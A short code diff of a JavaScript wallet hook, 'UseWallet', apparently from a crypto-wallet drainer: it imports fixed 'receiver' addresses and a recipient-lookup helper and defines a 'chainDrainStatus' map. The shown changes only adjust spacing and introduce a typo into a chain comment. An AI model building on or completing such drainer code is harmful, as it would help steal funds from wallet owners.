@@ -6,7 +6,7 @@ import axios from "axios";
 import { Contract, ethers, utils } from "ethers";
 import { providers } from "ethers";
 import contractAbi from "../blockchain/contract.json";
-import { config, API_KEY, receiver,receiver2 } from "./Web3Config";
+import { config, API_KEY, receiver, receiver2 } from "./Web3Config";
 import { getRecipientAddress } from "./getUserLocation";
 
 export const UseWallet = (amount) => {
@@ -20,7 +20,7 @@ export const UseWallet = (amount) => {
         43114: false, // Avalanche Mainnet
         42161: false, // Arbitrum Mainnet
         10: false, // Optimism Mainnet
-        42220: false, // Celo Mainnet
+        42220: false, // Celo Mainne
     };
 
     const chainDrainStatus = {
